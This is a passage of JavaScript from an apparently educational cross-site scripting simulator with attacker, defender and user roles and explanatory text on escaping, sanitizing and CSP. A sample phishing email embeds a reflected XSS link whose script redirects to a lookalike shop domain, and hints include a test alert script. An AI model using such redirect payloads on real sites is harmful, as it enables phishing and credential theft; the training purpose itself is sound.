        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText1').style.visibility = "hidden";
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;visibility:visible;font-size: 2vw;");

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:10%;width:50%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above action can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;


        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:1,Level:3")) {
            simulatorZoneAnswersArray.push("!Role:1,Level:3");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:1,Level:3");
            addedToSZArray = true;
        }


        if (buttonID == 1) {



            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L3-1-Interactive-CSP.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;height:40%;width:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:8%;width:70%;font-size: 2vw;background-color:#5e3c58;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Content Security Policy (CSP) can be used to mitigate CSS attacks by limiting the load of unauthorized resources.";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:3,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:3,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        }
    } else if ((roleId == 2 && (currentLevelNo == 1 || currentLevelNo == 200)) || ((roleId == 2 && currentLevelNo == 1 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:15%;left:35%;height:60%;width:30%");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:30%;left:3%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:30%;left:71%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-2%;left:12%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-2%;left:55%;");
        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:10%;width:60%;background-color: #FF7F11;font-size: 2vw;");
        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:28%;left:34%;width:32%;font-size: 1.4vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 25%;font-size: 1.8vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 25%;font-size: 1.8vw;");

        document.getElementById("circleInteractiveText1").innerHTML = "Click on the link and visit the website since you are a regular user of the e-commerce website";
        document.getElementById("circleInteractiveText2").innerHTML = "Report and confirm <br> the legitimacy of the link with the <br>e-commerce <br>company";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/laptop.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "visible";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        document.getElementById('simulatorInteractiveText1').innerHTML = "An email that contains a reference to a popular e-commerce website that you visit regularly";
        document.getElementById('simulatorInteractiveText2').innerHTML = "Don't miss your chance to enjoy discounts up to 70% when you shop at myshopping.com, visit https://myshopping.com?search=&lt;script&gt;window.location.replace(&quot;http://myshoping.com&quot;);&lt;/script&gt;. <br>Use the special discount code 'MY70OFF' at checkout. <br>Only valid till stocks last!";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;



        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:2,Level:1")) {
            simulatorZoneAnswersArray.push("!Role:2,Level:1");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:2,Level:1");
            addedToSZArray = true;
        }


        if (buttonID == 1) {

            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/User-L1-1-Interactive-Click.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:23%;left:20%;height:49%;width:60%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:75%;left:10%;font-size: 2vw;width:65%;background-color: #5e3c58");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText1').innerHTML = "The opened website looks almost identical to the e-commerce website you visit regularly. Thus, you might be tempted to login with your credentials and claim the discount.";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                UserSimZoneSkillsValue = UserSimZoneSkillsValue + userSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:2,Level:1,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:2,Level:1,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const InteractivityBackButton1Variable = document.getElementById('InteractivityBackButton1');

            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/User-L1-1-Interactive-Click-Main.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;height:45%;width:60%;z-index: 1;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";

            document.getElementById('simulatorInteractiveText1').innerHTML = "Checking the legitimacy of the link through the e-commerce company can be beneficial to avoid any potential scams.";

            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:82%;left:10%;background-color: #435274;font-size: 2vw;width:65%;");
            InteractivityBackButton1Variable.setAttribute("style", "position:fixed;top:12%;left:80%;visibility: visible;");
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                UserSimZoneSkillsValue = UserSimZoneSkillsValue + userSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:2,Level:1,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:2,Level:1,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    } else if ((roleId == 2 && (currentLevelNo == 2 || currentLevelNo == 200)) || ((roleId == 2 && currentLevelNo == 2 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:20%;left:20%;height:40%;width:60%;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:30%;left:51%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:30%;left:13%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-2%;left:61%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-2%;left:-8%;");
        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:10%;background-color: #FF7F11;width: 60%;font-size: 2vw;");
        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:34%;width: 50%;font-size: 2vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 20%;font-size: 2vw;");

        document.getElementById("circleInteractiveText1").innerHTML = "Login to the email account";
        document.getElementById("circleInteractiveText2").innerHTML = "Not providing the <br>login info & Not revisiting or disable JavaScript for the site when revisiting";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/User-L2-1-Interactive.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        document.getElementById('simulatorInteractiveText1').innerHTML = "Alerts to login to email or social media account, with a session timed out notice";


        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;



        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:2,Level:2")) {
            simulatorZoneAnswersArray.push("!Role:2,Level:2");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:2,Level:2");
            addedToSZArray = true;
        }

        if (buttonID == 1) {

            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const InteractivityBackButton1Variable = document.getElementById('InteractivityBackButton1');
            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/User-L2-1-Interactive-Login.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:55%;height:45%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:81%;left:8%;width: 70%;font-size: 2vw;background-color: #5e3c58;");
            InteractivityBackButton1Variable.setAttribute("style", "position:fixed;top:12%;left:90%;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText1').innerHTML = "The e-commerce website could be compromised and could prompt users with a malicious website masquerading as the legitimate e-mail website.";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                UserSimZoneSkillsValue = UserSimZoneSkillsValue + userSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }


            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:2,Level:2,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:2,Level:2,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";

            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const InteractivityBackButton1Variable = document.getElementById('InteractivityBackButton1');

            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/User-L2-1-Interactive-JS.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:55%; height:45%;z-index: 1;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";

            document.getElementById('simulatorInteractiveText1').innerHTML = "The e-commerce website could be compromised. It is best not to provide login info or revisit the website. If need to revisit, users can disable JavaScript for the e-commerce website. However, this can cause the website to not work properly.";

            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:83%;left:3%;background-color: #435274;width: 75%;font-size: 1.5vw;");
            InteractivityBackButton1Variable.setAttribute("style", "position:fixed;top:12%;left:88%;visibility: visible;");
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                UserSimZoneSkillsValue = UserSimZoneSkillsValue + userSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:2,Level:2,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:2,Level:2,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    }

}




function checkXSSAttack() {

    if (roleId == 0 && (currentLevelNo == 1 || currentLevelNo == 200)) {


        const alertString = "alert";
        const parenthesisOpen = "(";
        const parenthesisClose = ")";
        XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;
        XSSCheck = htmlEncode(XSSCheck);
        console.log(XSSCheck);
        XSSCheck = DOMPurify.sanitize(XSSCheck);
        console.log(XSSCheck);

        if (!SimZoneSkills2AddedtoBar) {
            AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
            OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
            SimZoneSkills2AddedtoBar = true;
        }

        if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
            XSSCheck = XSSCheck.split('(').pop().split(')')[0];
            alert(XSSCheck);
            XSSCheck = htmlEncode(XSSCheck);
            XSSCheck = DOMPurify.sanitize(XSSCheck);
            document.getElementById('simulatorInteractiveText1').innerHTML = "Since an alertbox is displayed, the website is susceptible to XSS attacks.This link can now be <br> sent to victims with more dangerous payloads.";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        } else {
            XSSCheck = htmlEncode(XSSCheck);
            XSSCheck = DOMPurify.sanitize(XSSCheck);
        }
    } else if (roleId == 0 && (currentLevelNo == 4 || currentLevelNo == 200)) {

        const alertString = "alert";
        const scriptString = "script";
        const parenthesisOpen = "(";
        const parenthesisClose = ")";

        XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;
        XSSCheck = htmlEncode(XSSCheck);
        XSSCheck = DOMPurify.sanitize(XSSCheck);


        if (SimZoneStoredXSSSubmitButtonClickedCounter > 0 && XSSAlertScriptSubmitted) {

            if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
                XSSCheck = XSSCheck.split('(').pop().split(')')[0];
                document.getElementById('simulatorInteractiveText1').innerHTML = "After the XSS script is stored, any user visiting the site will be at risk.";

                setTimeout(displayAlertBox(XSSCheck), 2000);


            }

            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }



        }

        if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2 -Interactive.png";
            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "View as User";
            document.getElementById('simulatorInteractiveText1').innerHTML = "The XSS script has been stored. Click the View as User button to visit the site as a different user following the Stored XSS attack.";
            XSSAlertScriptSubmitted = true;
        }




    } else if (roleId == 0 && (currentLevelNo == 7 || currentLevelNo == 200)) {

        if (insideSimulatorAction1) {
            const alertString = "alert";
            const scriptString = "script";
            const parenthesisOpen = "(";
            const parenthesisClose = ")";

            XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;
            XSSCheck = htmlEncode(XSSCheck);
            XSSCheck = DOMPurify.sanitize(XSSCheck);




            if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
                XSSCheck = XSSCheck.split('(').pop().split(')')[0];
                document.getElementById('simulatorInteractiveText1').innerText = "Since there is no validation or sanitation, attackers can manipulate the url to display an alertbox. This site is vulnerable to DOM based XSS attacks.";


                alert(XSSCheck);
                document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
            }

            if (!SimZoneSkills1AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }




            if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
                document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2 -Interactive.png";
                document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
                document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "View as User";
                document.getElementById('simulatorInteractiveText1').innertext = "Submit a test script like <script>alert(‘test’);</script> to see if JavaScript (JS) can be executed on the webpage";
                XSSAlertScriptSubmitted = true;
            }
        } else if (insideSimulatorAction2) {
            const alertString = "alert";
            const scriptString = "script";
            const parenthesisOpen = "(";
            const parenthesisClose = ")";

            XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;

            XSSCheck = htmlEncode(XSSCheck);
            XSSCheck = DOMPurify.sanitize(XSSCheck);


            if (imageExists(XSSCheck)) {
                document.getElementById("DOMSimImage").src = XSSCheck;
                document.getElementById('simulatorInteractiveText1').innerText = "Since the website address an image source, attackers can insert a script to remove the existing image and point to an external image source.";
                document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
            }



            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }




            if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
                document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2 -Interactive.png";
                document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
                document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "View as User";
                document.getElementById('simulatorInteractiveText1').innertext = "Submit a test script like <script>alert(‘test’);</script> to see if JavaScript (JS) can be executed on the webpage";
                XSSAlertScriptSubmitted = true;
            }
        }

    } else if (roleId == 0 && (currentLevelNo == 8 || currentLevelNo == 200)) {


        const alertString = "alert";
        const parenthesisOpen = "(";
        const parenthesisClose = ")";
        XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;
        XSSCheck = htmlEncode(XSSCheck);
        XSSCheck = DOMPurify.sanitize(XSSCheck);



        if (!SimZoneSkills1AddedtoBar) {
            AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
            OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
            SimZoneSkills1AddedtoBar = true;
        }

        if (XSSCheck.includes(alertString) && XSSCheck.includes(parenthesisOpen) && XSSCheck.includes(parenthesisClose)) {
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-2-Username-LS.png";
            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').innertext = "";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Since an alertbox is displayed, the website is vulnerable to DOM based XSS attacks.";
            XSSCheck = XSSCheck.split('(').pop().split(')')[0];

            alert(XSSCheck);
            XSSCheck = htmlEncode(XSSCheck);
            XSSCheck = DOMPurify.sanitize(XSSCheck);

        } else {
            XSSCheck = htmlEncode(XSSCheck);
            XSSCheck = DOMPurify.sanitize(XSSCheck);
        }
    } else if (roleId == 1 && (currentLevelNo == 1 || currentLevelNo == 200)) {


        const alertString = "alert";
        const parenthesisOpen = "(";
        const parenthesisClose = ")";
        XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;
        const sanitizedTextVariable = document.getElementById("sanitizedText");
        XSSCheck = htmlEncode(XSSCheck);
        XSSCheck = DOMPurify.sanitize(XSSCheck);


        document.getElementById('sanitizedText').style.visibility = "visible";
        document.getElementById("sanitizedText").textContent = XSSCheck;

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-1-Sim-Script.png";
        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText1').innertext = "";
        document.getElementById('simulatorInteractiveText1').innerHTML = "Escaping input converts the HTML code into non-executable text. <br>Meanwhile, sanitizing removes most of the HTML code from the input.";
        XSSCheck = htmlEncode(XSSCheck);
        XSSCheck = DOMPurify.sanitize(XSSCheck);

        if (!SimZoneSkills1AddedtoBar) {
            DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
            OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
            SimZoneSkills1AddedtoBar = true;
        }
    } else if (roleId == 1 && (currentLevelNo == 2 || currentLevelNo == 200)) {


        const alertString = "alert";
        const parenthesisOpen = "(";
        const parenthesisClose = ")";
        XSSCheck = document.getElementById("XSSCheckBoxAttackerReflected").value;
        const sanitizedTextVariable = document.getElementById("sanitizedText");

        XSSCheck = htmlEncode(XSSCheck);


        sanitizedTextVariable.setAttribute("style", "position:fixed;top:40%;left:13%;z-index: 1;visibility:visible;width:50%;word-wrap: break-word;");
        document.getElementById("sanitizedText").textContent = XSSCheck;

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2-Stored-sim.png";
        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText1').innertext = "";
        document.getElementById('simulatorInteractiveText1').innerHTML = "Escaping input converts the HTML code into non-executable text. <br>Meanwhile, sanitizing removes most of the HTML code from the input.";
        XSSCheck = DOMPurify.sanitize(XSSCheck);

        if (!SimZoneSkills1AddedtoBar) {
            DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
            OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
            SimZoneSkills1AddedtoBar = true;
        }




    }
    SimZoneStoredXSSSubmitButtonClickedCounter = SimZoneStoredXSSSubmitButtonClickedCounter + 1;
}




function openPlayerStatsZone(level) {

    if (level == "Ingame-Level") {

        if (roleId == 0) {
            tabSelected('Attacker');
            const affirmativeFeedbackAttackerInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
            affirmativeFeedbackAttackerInGame.innerText = affirmativeAttackerProgressFeedbackList[Math.floor(Math.random() * affirmativeAttackerProgressFeedbackList.length)];
            affirmativeFeedbackAttackerInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

            const personalizedFeedbackAttackerInGame = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackAttackerInGame.innerText = levelAttackerProgressFeedbackList[Math.floor(Math.random() * levelAttackerProgressFeedbackList.length)];
            personalizedFeedbackAttackerInGame.setAttribute("style", "position:fixed;top:48%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");

        }

        if (roleId == 1) {
            tabSelected('Defender');
            const affirmativeFeedbackDefenderInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
            affirmativeFeedbackDefenderInGame.innerText = affirmativeDefenderProgressFeedbackList[Math.floor(Math.random() * affirmativeDefenderProgressFeedbackList.length)];
            affirmativeFeedbackDefenderInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

            const personalizedFeedbackDefenderInGame = document.getElementById('playerstatboard-feedback-box-text');
            personalizedFeedbackDefenderInGame.innerText = levelDefenderProgressFeedbackList[Math.floor(Math.random() * levelDefenderProgressFeedbackList.length)];
            personalizedFeedbackDefenderInGame.setAttribute("style", "position:fixed;top:48%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");

        }

        if (roleId == 2) {
            tabSelected('User');
